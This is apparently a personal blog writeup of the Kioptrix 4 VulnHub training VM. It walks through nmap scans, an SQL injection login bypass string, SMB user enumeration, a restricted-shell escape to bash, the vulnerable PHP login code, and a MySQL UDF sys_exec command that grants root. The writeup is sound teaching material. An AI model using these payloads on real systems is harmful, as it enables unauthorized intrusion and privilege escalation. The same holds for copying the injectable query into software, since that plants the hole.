---
layout: default
---

# Vulhub - Kioptrix 4 writeup 

![Header image](/assets/images/vh_kioptrix4/kioptrix4_header.png)

[VulnHub image link](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/)

:hole: :computer:

## Introduction 

Welcome to the last installment of the Kioptrix VM series.

> "Keeping in the spirit of things, this challenge is a bit different than the others but remains in the realm of the easy. Repeating myself I know, but things must always be made clear: These VMs are for the beginner. It’s a place to start."

## Initial recon

### Nmap scan

Starting with an aggressive (-A) fast (-T4) scan off all TCP ports on the machine and output the results to all formats (-oA).
```
sudo nmap -A -T4 -vv -p- -oA tcp_all_ports_agg 10.0.2.8
```

We can also conduct a relatively quick UDP version scan of the top 1000 ports.
```
sudo nmap -sUV -vv -oA udp_ver_top1000 10.0.2.8
```

#### TCP Scan Results
```
# Nmap 7.80 scan initiated Thu Jul 23 11:48:55 2020 as: nmap -A -T4 -vv -p- -oA tcp_all_ports_agg 10.0.2.8
Nmap scan report for 10.0.2.8
Host is up, received arp-response (0.00078s latency).
Scanned at 2020-07-23 11:48:56 EDT for 57s
Not shown: 39528 closed ports, 26003 filtered ports
Reason: 39528 resets and 26003 no-responses
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJQxDWMK4xxdEEdMA0YQLblzXV5xx6slDUANQmyouzmobMxTcImV1OfY9vB2LUjJwSbtuPn/Ef7LCik29SLab6FD59QsJKz3tOfX1UZJ9FeoxPhoVsfk+LDM4FbQxo0pPYhlQadVHAicjUnONl5WaaUEYuelAoU36v2wOKKDe+kRAAAAFQDAmqYNY1Ou7o5qEfZx0e9+XNUJ2QAAAIAt6puNENxfFnl74pmuKgeQaZQCsPnZlSyTODcP961mwFvTMHWD4pQsg0j6GlPUZrXUCmeTcNqbUQQHei6l8U1zMO4xFYxVz2kkGhbQAa/FGd1r3TqKXu+jQxTmp7xvNBVHoT3rKPqcd12qtweTjlYKlcHgW5XL3mR1Nw91JrhMlAAAAIAWHQLIOjwyAFvUhjGqEVK1Y0QoCoNLGEFd+wcrMLjpZEz7/Ay9IhyuBuRbeR/TxjitcUX6CC58cF5KoyhyQytFH17ZMpegb9x29mQiAg4wK1MGOi9D8OU1cW/COd/E8LvrNLxMFllatLVscw/WXXTi8fFmOEzkGsaRKC6NiQhDlg==
|   2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApA/UX2iq4JYXncTEDfBoyJWguuDkWDvyw4HlLyc1UBT3Pn2wnYLYa0MjwkBtPilmf5X1zK1z3su7oBEcSEt6o7RzDEUbC1O6nRvY4oSKwBD0qLaIHM1V5CZ+YDtLneY6IriJjHJ0DgNyXalPbQ36VZgu20o9dH8ItDkjlZTxRHPE6RnPiD1aZSLo452LNU3N+/2M/ny7QMvIyPNkcojeZQWS7RRSDa2lEUw1X1ECL6zCMiWC0lhciZf5ieum9MnATTF3dgk4BnCq6dfdEvae0avSypMcs6no2CJ2j9PPoAQ1VWj/WlAZzEbfna9YQ2cx8sW/W/9GfKA5SuLFt1u0iQ==
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 08:00:27:4B:C2:AB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/23%OT=22%CT=1%CU=38825%PV=Y%DS=1%DC=D%G=Y%M=080027%T
OS:M=5F19B1A1%P=x86_64-pc-linux-gnu)SEQ(SP=D1%GCD=1%ISR=D4%TI=Z%CI=Z%II=I%T
OS:S=7)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=
OS:M5B4ST11NW7%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=1
OS:6A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M5B4ST11
OS:NW7%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164
OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.000 days (since Thu Jul 23 11:49:34 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=209 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m57s, deviation: 2h49m42s, median: -2s
| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KIOPTRIX4<00>        Flags: <unique><active>
|   KIOPTRIX4<03>        Flags: <unique><active>
|   KIOPTRIX4<20>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 44972/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 14147/tcp): CLEAN (Timeout)
|   Check 3 (port 28855/udp): CLEAN (Failed to receive data)
|   Check 4 (port 40933/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2020-07-23T11:49:36-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.78 ms 10.0.2.8

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 23 11:49:53 2020 -- 1 IP address (1 host up) scanned in 58.80 seconds
```

There is an HTTP web server running on port 80 as well as SSH on ports 22 and SMB ports 139 and 445 open on the system.

#### UDP Scan Results

```
# Nmap 7.80 scan initiated Thu Jul 23 11:50:22 2020 as: nmap -sUV -vv -oA udp_ver_top1000 10.0.2.8
Increasing send delay for 10.0.2.8 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for 10.0.2.8
Host is up, received arp-response (0.00057s latency).
Scanned at 2020-07-23 11:50:23 EDT for 1181s
Not shown: 997 closed ports
Reason: 997 port-unreaches
PORT    STATE         SERVICE     REASON              VERSION
68/udp  open|filtered dhcpc       no-response
137/udp open          netbios-ns  udp-response ttl 64 Microsoft Windows netbios-ns (workgroup: WORKGROUP)
138/udp open|filtered netbios-dgm no-response
MAC Address: 08:00:27:4B:C2:AB (Oracle VirtualBox virtual NIC)
Service Info: Host: KIOPTRIX4; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 23 12:10:04 2020 -- 1 IP address (1 host up) scanned in 1181.58 seconds
```

## Enumeration

Since we see that port 80 is open lets enumerate the Website.

We are greeted with what appears to be a simple HTTP POST form login page. It appears that the login is susceptible to an SQL injection bypass attack using the following string in the password field to gain login without a password.

```
' or 1=1 -- -
```

![Kioptrix 4 Website login](/assets/images/vh_kioptrix4/vh_kioptrix4_webpage_1.jpg)

However trying to login as **admin** user reveals nothing interesting so we need to see if we can find any other usernames on the system.


### SMB

We can potentially find some details by enumerating the SMB ports.

We can use enum4linux script and scan all (-a) and output the results to a results file.
```
sudo enum4linux -a 10.0.2.8 | tee enum4linux_results.txt
```

The enum4linux script reveals the following bits of information that can help use further.

```
 ========================= 
|    Users on 10.0.2.8    |
 ========================= 
index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody	Name: nobody	Desc: (null)
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert	Name: ,,,	Desc: (null)
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root	Name: root	Desc: (null)
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john	Name: ,,,	Desc: (null)
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret	Name: loneferret,,,	Desc: (null)

user:[nobody] rid:[0x1f5]
user:[robert] rid:[0xbbc]
user:[root] rid:[0x3e8]
user:[john] rid:[0xbba]
user:[loneferret] rid:[0xbb8]

 =================================================================== 
|    Users on 10.0.2.8 via RID cycling (RIDS: 500-550,1000-1050)    |
 =================================================================== 
[I] Found new SID: S-1-5-21-2529228035-991147148-3991031631
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\loneferret (Local User)
S-1-22-1-1001 Unix User\john (Local User)
S-1-22-1-1002 Unix User\robert (Local User)
```

Looks like we found a few other users **(john, loneferret and robert)** of interest that we can try to use to log into the web application.

Logging into the application as John reveals the following details.

**Note** - You will have to clear the _PHPSESSID_ cookie each try to get clear results otherwise the web application seems to behave oddly not revealing any legitimate results.

![Kioptrix 4 John Login details](/assets/images/vh_kioptrix4/vh_kioptrix4_webpage_2.jpg)

Trying to use these details to login SSH on port 22 works, however it seems like we are in an custom restricted shell called **LigGoat shell** with limited commands.

![Escaping restricted shell](/assets/images/vh_kioptrix4/vh_kioptrix4_restricted_shell_1.jpg)

As you can see we are limited to the following commands
* cd
* clear
* echo
* exit
* help
* ll
* lpath
* ls

After some research we can use the following **echo** command to escape from the shell and gain a full bash shell by using a python system command.

```
echo os.system('/bin/bash')
```

Here is a great list of commands that can be used to spawn TTY shell and also be used to escape same jailed shells.

[Spawning a TTY Shell](https://netsec.ws/?p=337)

## Privilege Escalation

Checking out the /var/www/ folder to see the source code for the login script (checklogin.php) reveals a few interesting bits of information such as the MySQL databases username and blank password. It also shows us the SQL query that we exploited via SQL injection to login to the web application.

```php
<?php                                                                                                                                   
ob_start();                                                                                                                             
$host="localhost"; // Host name                                                                                                         
$username="root"; // Mysql username                                                                                                     
$password=""; // Mysql password                                                                                                         
$db_name="members"; // Database name                                                                                                    
$tbl_name="members"; // Table name                                                                                                      
                                                                                                                                        
// Connect to server and select databse.                                                                                                
mysql_connect("$host", "$username", "$password")or die("cannot connect");                                                               
mysql_select_db("$db_name")or die("cannot select DB");                                                                                  
                                                                                                                                        
// Define $myusername and $mypassword                                                                                                   
$myusername=$_POST['myusername'];                                                                                                       
$mypassword=$_POST['mypassword'];                                                                                                       
                                                                                                                                        
// To protect MySQL injection (more detail about MySQL injection)                                                                       
$myusername = stripslashes($myusername);                                                                                                
//$mypassword = stripslashes($mypassword);                                                                                              
$myusername = mysql_real_escape_string($myusername);                                                                                    
//$mypassword = mysql_real_escape_string($mypassword);

//$sql="SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'";
$result=mysql_query("SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'");
//$result=mysql_query($sql);

// Mysql_num_row is counting table row
$count=mysql_num_rows($result);
// If result matched $myusername and $mypassword, table row must be 1 row

if($count!=0){
// Register $myusername, $mypassword and redirect to file "login_success.php"
        session_register("myusername");
        session_register("mypassword");
        header("location:login_success.php?username=$myusername");
}
else {
echo "Wrong Username or Password";
print('<form method="link" action="index.php"><input type=submit value="Try Again"></form>');
}

ob_end_flush();
?>
```

Since the username of the database user is **root** lets check to see if the MySQL service is running as root permissions. If this is the case we can use this along with an SQL UDF (User-Defined Function) to gain root privileges.

Use the following command to see all running process.
```
ps aux
```

![MySQL Root process](/assets/images/vh_kioptrix4/vh_kioptrix4_mysql_privesc_1.jpg)

This blog post by Bernardo Dag exploits the exploit pretty well.

[Blog link](https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html)

Basically we can use the UDF functionality within MySQL to execute system commands on the underlying operating system.

To do so, we need to download the lib_mysqludf_sys.so library, which will allow us to perform commands to escalate our privileges to root.

[lib_muysqludf_sys.so download repo](https://github.com/mysqludf/lib_mysqludf_sys)

We can use the following command to see if we have the correct library on the system.
```
ls -la /usr/lib/lib_mysqludf_sys.so 
```

Since its already on the system there is no need to download it.

The library implements the following 3 functions we can potentially use.
* sys_exec: executes an arbitrary command, and can thus be used to launch an external application.
* sys_get: gets the value of an environment variable.
* sys_set: create an environment variable, or update the value of an existing environment variable.

The easiest method would be to use the sys_exec function to give our user john admin permissions on the system. Login to the mysql database console as root and execute the following command to gain root access to the system.
```
select sys_exec('usermod -a -G admin john');
```

![MySQL privilege escalation](/assets/images/vh_kioptrix4/vh_kioptrix4_mysql_privesc_2.jpg)

As you can see we gained root on the system!

## Summary

Overall this box was pretty fun as it involved piecing together a few bits of critical information in order to get access to the box and then root it.
As you can see below loneferret states there are two ways to root the box. We demonstrated the 1 way above using the MySQL UDF privilege escalation technique the other approach would be to use a Linux Kernel exploit as the machine is running a relatively old version of the kernel that is vulnerable

> Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux

![Congrats](/assets/images/vh_kioptrix4/vh_kioptrix4_root.jpg)
